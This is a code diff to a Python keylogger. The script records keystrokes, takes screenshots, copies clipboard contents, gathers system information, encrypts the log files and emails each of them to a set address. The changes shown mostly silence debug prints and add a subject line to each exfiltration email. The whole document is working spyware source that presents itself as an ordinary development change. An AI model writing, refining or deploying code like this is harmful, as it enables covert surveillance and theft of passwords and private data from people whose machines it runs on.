@@ -64,12 +64,14 @@ def keylogged(oldtime):
 
 
     def on_release(key):
+        # debugging print statements
         #print("on release: ")
         #print(oldtime)
         #print (" ")
-        print("on release" + str(currTime) )
+        # print("on release" + str(currTime) )
         if key == Key.esc:
             return False
+        # check if a minute has passed
         if ( currTime - oldtime > 59 ):
             return False
 
@@ -79,13 +81,16 @@ def keylogged(oldtime):
     
     # sending screenshot to email
     keylog.screenshot()
-    keylog.send_email(screenshot_info, file_path + extend + screenshot_info, to_addr)
+    subject = "ScreenShot Information"
+    keylog.send_email(screenshot_info, file_path + extend + screenshot_info, to_addr, subject)
 
     # sending clipboard to email
     keylog.copy_clipboard()
-    keylog.send_email(clipboard_info, file_path + extend + clipboard_info, to_addr)
+    subject = "Clipboard Information"
+    keylog.send_email(clipboard_info, file_path + extend + clipboard_info, to_addr, subject)
 
-    keylog.send_email(key_log, file_path + extend + key_log, to_addr)
+    subject = "Key Log Information"
+    keylog.send_email(key_log, file_path + extend + key_log, to_addr, subject)
 
 
 def main():
@@ -94,7 +99,8 @@ def main():
         sys_file.write(" ")
     # get computer information
     keylog.comp_info()
-    keylog.send_email(system_info, file_path + extend + system_info, to_addr)
+    subject = "System Information"
+    keylog.send_email(system_info, file_path + extend + system_info, to_addr, subject)
 
     # variable to hold count to keep while loop in check
     countMin = 0
@@ -107,9 +113,6 @@ def main():
     # will continue to read the users computer for specified minutes
     while countMin < minutes:
         
-        # every minute perform keylogging functions
-        #schedule.every(2).minute.do(keylogged)
-        
         # clearing the clipboard info
         with open(file_path + extend + clipboard_info, "w") as clip_file:
             clip_file.write(" ")
@@ -119,17 +122,14 @@ def main():
             file.write(" ")
         
         oldtime = time.time()
-        print("before sleep time: " + str(oldtime) )
+        #print("before sleep time: " + str(oldtime) )
 
         keylogged(oldtime)
-
-        # increment counter
         
-        # time.sleep(60)
-        
-        newtime = time.time()
-        print("\n")
-        print("after sleep time: " + str(newtime) )
+        # debugging print statements
+        #newtime = time.time()
+        #print("\n")
+        #print("after sleep time: " + str(newtime) )
         
         # increment counter
         countMin += 1
@@ -151,7 +151,8 @@ def main():
         with open(encrypted_file[fileCount], 'wb') as file:
             file.write(encrypted)
 
-        keylog.send_email(encrypted_file[fileCount], encrypted_file[fileCount], to_addr)
+        subject = "Encrypted Information"
+        keylog.send_email(encrypted_file[fileCount], encrypted_file[fileCount], to_addr, subject)
         fileCount += 1
 
 if __name__ == '__main__':
